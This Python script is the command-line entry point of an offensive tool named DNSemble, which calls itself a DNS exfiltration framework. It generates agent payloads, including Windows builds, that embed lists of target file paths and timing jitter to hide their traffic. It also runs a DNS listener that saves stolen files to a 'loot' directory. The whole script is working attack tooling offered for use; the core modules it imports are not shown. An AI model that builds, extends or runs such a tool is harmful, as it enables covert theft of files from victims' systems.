#!/usr/bin/env python3
"""
DNSemble - DNS exfiltration framework.

Entry point: payload generation, server mode, or both (--serve).

Generation and serving are independent: --payload only writes an agent,
running with no --payload starts the listener, and --serve chains them
explicitly.
"""

import argparse
import sys
from pathlib import Path

from core import domains as domains_mod
from core.config import (
    ConfigError,
    build_server_config, ensure_loot_dir_writable, resolve_upstream,
    validate_host, validate_timing, validate_embedded_files,
)
from core.functions import C, list_payloads, fail
from core.builder import PAYLOADS, generate_payload, _resolve_payload_key
from core.dnsserver import DNSembleServer


def build_parser():
    ap = argparse.ArgumentParser(
        description="DNSemble - DNS exfiltration framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  %(prog)s --payloads                                 "
            "Show available payloads\n"
            "  %(prog)s --payload 1 --host 1.2.3.4                 "
            "Generate agent only\n"
            "  %(prog)s --payload generic/python --host 1.2.3.4 --serve\n"
            "                                                      "
            "Generate, then listen\n"
            "  %(prog)s --payload 2 --host 1.2.3.4 -a x86         "
            "Windows x86 payload\n"
            "  %(prog)s -p 5353                                    "
            "Start DNS listener\n"
        ),
    )

    gen = ap.add_argument_group("payload generation")
    gen.add_argument("--payloads", action="store_true",
                     help="List available payload types")
    gen.add_argument("--payload", metavar="TYPE",
                     help="Generate a payload (name or number from --payloads)")
    gen.add_argument("--host", metavar="IP",
                     help="Public IP/hostname the agent will connect to")
    gen.add_argument("-a", "--arch", choices=["x64", "x86"], default="x64",
                     help="Target architecture for Windows payloads (default x64)")
    gen.add_argument("--jitter", type=float, default=50,
                     help="Jitter in ms baked into the agent (default 50)")
    gen.add_argument("--delay", type=float, default=100,
                     help="Delay in ms between queries baked into the agent (default 100)")
    gen.add_argument("-o", "--output", metavar="FILE",
                     help="Output filename (default: auto-generated)")
    gen.add_argument("--files", metavar="LIST",
                     help="Text file with target paths to embed (one per line)")
    gen.add_argument("--domains", metavar="FILE",
                     help="Custom domain list file (default: data/domains.txt)")

    srv = ap.add_argument_group("server mode")
    srv.add_argument("--serve", action="store_true",
                     help="Start the DNS listener after generating a payload "
                          "(without --payload, the listener always starts)")
    srv.add_argument("-p", "--port", type=int, default=5353,
                     help="UDP listen port, 1-65535 (default 5353)")
    srv.add_argument("-u", "--upstream", default="8.8.8.8",
                     help="Upstream DNS resolver (default 8.8.8.8)")
    srv.add_argument("-l", "--loot-dir", default="./loot",
                     help="Directory to save exfiltrated files (default ./loot)")
    srv.add_argument("--session-timeout", type=float, default=300,
                     help="Seconds before an idle session is dropped (default 300)")
    srv.add_argument("--max-sessions", type=int, default=64,
                     help="Maximum concurrent sessions, 1-255 (default 64)")
    srv.add_argument("--verbose", action="store_true",
                     help="Log every DNS query while a transfer runs")
    srv.add_argument("--show-content", action="store_true",
                     help="Echo exfiltrated content to the console on completion")
    return ap


def _load_embedded_files(ap, args):
    if not args.files:
        return None
    p = Path(args.files)
    if not p.is_file():
        ap.error(f"--files list not found: {args.files}")
    embedded = [l.strip() for l in p.read_text().splitlines() if l.strip()]
    try:
        return validate_embedded_files(embedded)
    except ConfigError as e:
        fail(str(e), code=2)


def _load_domains(args):
    if args.domains:
        p = Path(args.domains)
        if not p.is_file():
            fail(f"Domain list not found: {args.domains}", code=2)
        try:
            domains_mod.init_domains(p)
        except (OSError, ValueError) as e:
            fail(f"Invalid domain list {args.domains}: {e}", code=2)
    return domains_mod.DOMAINS


def _run_generation(ap, args, domains):
    if not args.host:
        ap.error("--host is required when generating a payload")
    if _resolve_payload_key(args.payload) is None:
        fail(f"Unknown payload: {args.payload}\n"
             f"    Run with --payloads to see available options.", code=2)

    try:
        host = validate_host(args.host, _resolve_payload_key(args.payload))
        delay, jitter = validate_timing(args.delay, args.jitter)
    except ConfigError as e:
        fail(str(e), code=2)

    embedded = _load_embedded_files(ap, args)

    generate_payload(args.payload, host, args.port, jitter, delay,
                     args.output, arch=args.arch,
                     embedded_files=embedded, domains=domains)


def _run_server(args):
    try:
        cfg = build_server_config(
            args.port, args.upstream, args.loot_dir,
            _load_domains(args),
            args.session_timeout, args.max_sessions)
    except ConfigError as e:
        fail(str(e), code=2)

    try:
        cfg["upstream_ip"] = resolve_upstream(cfg["upstream"])
        ensure_loot_dir_writable(cfg["loot_dir"])
    except ConfigError as e:
        fail(str(e), code=1)

    try:
        DNSembleServer(cfg, verbose=args.verbose,
                       show_content=args.show_content).start(
                           skip_banner=bool(args.payload))
    except KeyboardInterrupt:
        pass


def main():
    ap = build_parser()
    args = ap.parse_args()

    if args.payloads:
        list_payloads(PAYLOADS)
        return

    if args.payload:
        _run_generation(ap, args, _load_domains(args))
        if args.serve:
            print()
            _run_server(args)
        return

    _run_server(args)


if __name__ == "__main__":
    main()
